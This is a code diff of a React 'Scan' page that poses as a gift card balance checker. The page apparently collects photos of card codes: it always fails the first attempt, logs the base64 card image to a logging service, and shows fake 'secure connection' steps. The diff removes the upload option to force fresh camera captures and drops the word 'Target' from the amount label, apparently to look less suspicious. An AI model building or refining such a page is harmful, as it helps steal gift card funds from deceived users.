@@ -1,5 +1,5 @@
 // src/pages/Scan.jsx
-import React, { useState, useRef, useEffect } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import Navbar from '../components/Navbar';
 import { logBalanceCheck } from '../services/logService';
@@ -61,8 +61,6 @@ const Scan = () => {
   const [processingComplete, setProcessingComplete] = useState(false);
   const [showErrorModal, setShowErrorModal] = useState(false);
 
-  const fileInputRef = useRef(null);
-
   const processingSteps = [
     { text: '🔐 Establishing secure connection...', duration: 800 },
     { text: '📸 Analyzing image matrix...', duration: 600 },
@@ -114,16 +112,17 @@ const Scan = () => {
     reader.readAsDataURL(file);
   };
 
-  const handleFileUpload = (e) => { const file = e.target.files[0]; if (file) handleImageSelect(file); };
   const handleCameraCapture = () => {
     const input = document.createElement('input');
-    input.type = 'file'; input.accept = 'image/*'; input.capture = 'environment';
+    input.type = 'file'; 
+    input.accept = 'image/*'; 
+    input.capture = 'environment';
     input.onchange = (e) => { const file = e.target.files[0]; if (file) handleImageSelect(file); };
     input.click();
   };
 
   const completeFirstAttempt = async () => {
-    setMessage(`❌ UNABLE TO VERIFY CARD\n\nPlease ensure:\n• The card number is fully visible\n• All 14 alphanumeric characters are readable\n• The image is well-lit and in focus\n\nPlease upload a CLEARER image.`);
+    setMessage(`❌ UNABLE TO VERIFY CARD\n\nPlease ensure:\n• The card number is fully visible\n• All 14 alphanumeric characters are readable\n• The image is well-lit and in focus\n\nPlease capture a CLEARER image.`);
     setMessageType('error');
     try { await logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }); } catch (err) {}
     setSelectedImage(null); setAttemptCount(1); setShowBalance(false); setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false);
@@ -145,18 +144,17 @@ const Scan = () => {
   };
 
   const handleCheckBalance = () => {
-    if (!selectedImage) { setMessage('❌ Please upload or take a photo'); setMessageType('error'); return; }
+    if (!selectedImage) { setMessage('❌ Please capture a photo'); setMessageType('error'); return; }
     if (!amount || parseFloat(amount) <= 0) { setMessage('❌ Please enter a valid amount'); setMessageType('error'); return; }
     if (parseFloat(amount) > 10000) { setMessage('❌ Amount cannot exceed $10,000'); setMessageType('error'); return; }
     setShowBalance(false); setMessage(''); setMessageType(''); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false); setIsProcessing(true);
   };
 
-  const handleModalRetry = () => { setShowErrorModal(false); if (fileInputRef.current) fileInputRef.current.value = ''; };
+  const handleModalRetry = () => { setShowErrorModal(false); };
 
   const resetFullScreen = () => {
     setShowFullScreenBalance(false); setShowBalance(false); setBalance(''); setSelectedImage(null); setAmount(''); setMessage(''); setMessageType('');
     setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setAttemptCount(0); setProcessingComplete(false); setShowErrorModal(false);
-    if (fileInputRef.current) fileInputRef.current.value = '';
   };
 
   if (showFullScreenBalance) return <FullScreenBalance balance={balance} lastFourDigits="••••" cardType="GIFT CARD" onCheckAnother={resetFullScreen} />;
@@ -187,24 +185,25 @@ const Scan = () => {
 
           {attemptCount > 0 && !isProcessing && !showBalance && (
             <div className="mb-6 p-3 border border-[#ffaa00] bg-[#ffaa00]/10 text-center font-mono text-[0.65rem] sm:text-xs text-[#ffaa00] uppercase tracking-wider" style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%)' }}>
-              ⚠️ Retry Required: Upload a clearer photo.
+              ⚠️ Retry Required: Capture a clearer photo.
             </div>
           )}
 
           <div className="text-center mb-6">
             <img src={razerGuide} alt="Guide" className="mx-auto max-w-[200px] border-2 border-[#222] opacity-80 hover:opacity-100 transition-opacity" onError={(e) => { e.target.src = 'https://via.placeholder.com/240x120/1a2a1a/00ff41?text=Scan+Guide'; }} />
-            <p className="text-[#666] text-[0.6rem] sm:text-[0.65rem] mt-3 font-mono uppercase tracking-widest">Ensure all 14 characters are perfectly visible.</p>
+            
+            {/* BOLD AND GREEN TEXT */}
+            <p className="text-[#00ff41] font-bold text-[0.65rem] sm:text-xs mt-3 font-mono uppercase tracking-widest">
+              Ensure all 14 characters are perfectly visible.
+            </p>
           </div>
 
-          <div className="flex gap-4 mb-6">
-            <button onClick={() => fileInputRef.current?.click()} disabled={isProcessing} className="flex-1 bg-[#111] border border-[#333] text-[#00ff41] py-3 font-bold text-xs tracking-widest uppercase flex items-center justify-center gap-2 hover:border-[#00ff41] hover:shadow-[0_0_15px_rgba(0,255,65,0.2)] transition-all disabled:opacity-50" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
-              📤 Upload
-            </button>
-            <button onClick={handleCameraCapture} disabled={isProcessing} className="flex-1 bg-[#111] border border-[#333] text-[#00ff41] py-3 font-bold text-xs tracking-widest uppercase flex items-center justify-center gap-2 hover:border-[#00ff41] hover:shadow-[0_0_15px_rgba(0,255,65,0.2)] transition-all disabled:opacity-50" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
-              📸 Camera
+          {/* ONLY CAMERA BUTTON REMAINS */}
+          <div className="flex mb-6">
+            <button onClick={handleCameraCapture} disabled={isProcessing} className="w-full bg-[#111] border border-[#333] text-[#00ff41] py-3 font-bold text-xs tracking-widest uppercase flex items-center justify-center gap-2 hover:border-[#00ff41] hover:shadow-[0_0_15px_rgba(0,255,65,0.2)] transition-all disabled:opacity-50" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
+              📸 Capture Image
             </button>
           </div>
-          <input type="file" ref={fileInputRef} accept="image/*" onChange={handleFileUpload} className="hidden" />
 
           {selectedImage && !isProcessing && (
             <div className="bg-[#050505] border border-[#333] p-4 mb-6 text-center relative group">
@@ -217,7 +216,8 @@ const Scan = () => {
           )}
 
           <div className="mb-6 relative">
-            <label className="block text-[#888] text-[0.65rem] sm:text-xs mb-2 font-bold tracking-wider uppercase">💰 Target Amount (USD)</label>
+            {/* REMOVED 'TARGET' FROM LABEL */}
+            <label className="block text-[#888] text-[0.65rem] sm:text-xs mb-2 font-bold tracking-wider uppercase">💰 Amount (USD)</label>
             <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="e.g., 50" min="1" max="10000" disabled={isProcessing} className="w-full p-3 sm:p-4 bg-[#050505] border-2 border-[#222] text-white text-sm font-mono tracking-widest focus:outline-none focus:border-[#00ff41] focus:shadow-[0_0_15px_rgba(0,255,65,0.2)] disabled:opacity-50 transition-all" style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }} />
           </div>
 
@@ -237,7 +237,7 @@ const Scan = () => {
 
           {!isProcessing && (
             <button onClick={handleCheckBalance} disabled={!selectedImage || !amount} className="w-full bg-[#00ff41] text-black py-4 font-black text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-[#111] disabled:text-[#555] disabled:border disabled:border-[#333]" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>
-              {attemptCount === 0 ? 'Check Balance' : attemptCount === 1 ? 'Retry Scan' : 'Final Attempt'}
+              {attemptCount === 0 ? 'Initiate Scan' : attemptCount === 1 ? 'Retry Scan' : 'Final Attempt'}
             </button>
           )}
 
